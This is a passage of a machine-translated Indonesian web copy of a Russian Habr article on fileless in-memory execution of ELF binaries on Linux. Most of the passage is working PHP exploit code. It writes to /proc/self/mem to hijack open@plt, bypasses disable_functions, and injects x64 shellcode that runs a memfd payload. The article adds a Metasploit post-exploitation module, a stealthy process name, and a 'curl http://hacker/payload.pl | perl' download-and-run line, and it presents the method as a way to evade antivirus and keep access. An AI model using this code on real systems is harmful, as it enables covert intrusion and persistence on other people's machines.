class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Kami memeriksa kedalaman bit dari sistem operasi dan versi kernel Linux: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  Untuk menghindari pembatasan fungsi <code>disable_functions</code> , skrip menulis ulang alamat fungsi <code>open@plt</code> dengan cepat.  Kami membuat beberapa tambahan pada kode beched'a, dan sekarang kami dapat menempatkan shellcode kami di memori. </p><br><p>  Pertama, Anda perlu menemukan pergeseran dalam file biner dari interpreter PHP itu sendiri, untuk ini kita beralih ke <code>/proc/self/exe</code> dan parsing file executable menggunakan fungsi <code>parseelf()</code> dijelaskan di atas: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Temukan alamat fungsi <code>open()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Sekarang Anda dapat langsung mengunduh file yang dapat dieksekusi kami. <br>  Pertama, buat file anonim: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Kami menulis beban ke file anonim: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Kami mencari nomor deskriptor file: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Selanjutnya, kita menulis path ke file yang dapat dieksekusi pada stack: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  Dan argumen untuk menjalankan diteruskan ke executable: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Selanjutnya, dengan memanggil <code>fork()</code> , kami mengeksekusi payload kami: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode biasanya berarti urutan byte yang disimpan dalam memori dan kemudian dieksekusi, biasanya dalam konteks program lain, menggunakan serangan buffer overflow dan lainnya.  Dalam kasus kami, shellcode tidak mengembalikan kami prompt perintah dari server jauh (sebenarnya Shell), tetapi memungkinkan kami untuk mengeksekusi perintah yang kami butuhkan. </p><br><p>  Untuk mendapatkan urutan byte yang diperlukan, Anda bisa menulis kode C, lalu menerjemahkannya ke bahasa assembler, atau menulis bahasa rakitan dari awal. </p><br><p>  Mari kita lihat apa yang tersembunyi di balik urutan byte dari daftar di atas. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Peluncuran program kami dimulai dengan c <code>fork</code> .  57 adalah nilai numerik pengidentifikasi panggilan sistem untuk sistem 64-bit.  Tabelnya dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . </p><br><p>  Selanjutnya, kami memanggil <code>setsid</code> (pengenal angka 112) untuk mengonversi proses anak ke induk: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Kemudian lakukan <code>fork</code> lain: </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Kemudian jalankan <code>execve()</code> familiar <code>execve()</code> : </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  Dan kami mengakhiri proses dengan <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Jadi, kami mengganti kode fungsi open () saat bepergian.  File yang dapat dieksekusi kami ditempatkan di memori dan dieksekusi melalui penerjemah PHP.  Panggilan sistem disajikan sebagai shellcode. </p><br><h3 id="metasploit-framework">  Kerangka kerja metasploit </h3><br><p>  Sebagai kompilasi dari teknik-teknik di atas, kami telah menyiapkan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">modul untuk MSF</a> . </p><br><p>  Untuk menambahkannya ke Metasploit, cukup salin file modul ke direktori <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> dan kemudian jalankan perintah <code>reload_all</code> di konsol kerangka. <br>  Untuk menggunakan modul kami, masukkan <code>use post/linux/manage/download_exec_elf_in_memory</code> (atau jalur lain, tergantung pada direktori tempat file modul ditempatkan) <br>  Sebelum menggunakannya, Anda harus mengatur opsi yang diperlukan.  Daftar opsi ditampilkan dengan perintah <code>show options</code> . </p><br><p>  <code>ARGS</code> - Argumen untuk dieksekusi </p><br><p>  <code>FILE</code> - path ke file yang dapat dieksekusi.  Dalam kasus kami, ini adalah Netcat. </p><br><p>  <code>NAME</code> adalah nama prosesnya.  Anda bisa memanggilnya apa saja.  Sebagai contoh, demi sembunyi-sembunyi, ini mungkin kworker: 1 baik, atau untuk tujuan menunjukkan sesuatu komik, misalnya KittyCat </p><br><p>  <code>SESSION</code> - sesi meterpreter.  Dapat dipahami bahwa modul ini akan digunakan untuk tujuan pasca operasi. </p><br><p>  Selanjutnya, kita menunjuk host di mana http-server dengan beban kita akan ditempatkan dan port-nya dalam opsi <code>SRVHOST</code> dan <code>SRVPORT</code> masing-masing. </p><br><p>  <code>VECTOR</code> - metode di mana eksekusi program dalam memori akan dicapai, parameternya opsional, jika kosong, skrip itu sendiri akan menetapkan keberadaan penerjemah yang diperlukan.  PHP, Python atau Perl saat ini didukung. </p><br><p>  <code>run</code> menggunakan <code>exploit</code> atau <code>run</code> perintah </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Ini berfungsi sebagai berikut - kami menunjukkan sesi yang diinginkan, dapat berupa meterpreter atau reverse-shell biasa.  Selanjutnya, kami menunjukkan jalur lokal ke peri kami, argumen dan nama yang diinginkan dalam daftar proses.  Setelah start, server web lokal akan diluncurkan untuk menampung muatan, dan sesi akan mencari "kursi goyang", curl dan wget saat ini didukung.  Setelah menemukan setidaknya satu dari mereka, semua penerjemah akan dicari jika kita belum menentukan parameter <code>VECTOR</code> mana yang kita butuhkan.  Nah, jika berhasil, sebuah perintah akan dieksekusi untuk mengunduh muatan dari server web kami dan mentransfernya melalui pipa ke penerjemah yang diinginkan, mis.  sesuatu seperti <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  Alih-alih sebuah kesimpulan. </h3><br><p>  Mengunduh file ELF tanpa fileless di Linux adalah teknik yang berguna untuk pengujian penetrasi.  Ini adalah metode yang cukup hening yang dapat menahan berbagai macam alat perlindungan anti-virus, sistem pemantauan integritas dan sistem pemantauan yang memantau perubahan isi hard drive.  Dengan cara ini, Anda dapat dengan mudah mempertahankan akses ke sistem target, sambil meninggalkan jejak minimum. <br>  Pada artikel ini, kami menggunakan bahasa pemrograman yang ditafsirkan, sering diinstal secara default pada distribusi Linux, firmware, router, dan perangkat seluler.  Saya juga ingin mengucapkan terima kasih kepada penulis <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">artikel ini</a> , yang menginspirasi kami untuk ulasan ini. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id430902/">https://habr.com/ru/post/id430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id430890/index.html">Di mana lincah itu mengerikan, terutama scrum</a></li>
<li><a href="../id430892/index.html">Kombinasi dari cross-platform dan pendekatan asli dalam pengembangan aplikasi mobile</a></li>
<li><a href="../id430894/index.html">Situasi: merek semakin banyak menghabiskan uang untuk beriklan di podcast - kami mengerti mengapa</a></li>
<li><a href="../id430896/index.html">Linux Foundation telah membentuk dana untuk GraphQL dan Ceph - mengapa mereka dibutuhkan dan apa yang diharapkan dari mereka</a></li>
<li><a href="../id430900/index.html">Laser pertama dalam sejarah: apa itu</a></li>
<li><a href="../id430906/index.html">Ibu tidur dengan tenang di malam hari - kami mengumpulkan OpenCV untuk Raspbian'a</a></li>
<li><a href="../id430908/index.html">Modul Kontrol Konverter Daya: Pengembangan dan Perakitan</a></li>
<li><a href="../id430910/index.html">Beasiswa Fulbright: Bagaimana dan Mengapa?</a></li>
<li><a href="../id430912/index.html">Kami membawa pembohong ke air bersih: wawancara bukanlah hubungan kerja. Secara alami</a></li>
<li><a href="../id430914/index.html">Analisis harga pasar gelap untuk data pribadi dan menerobos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>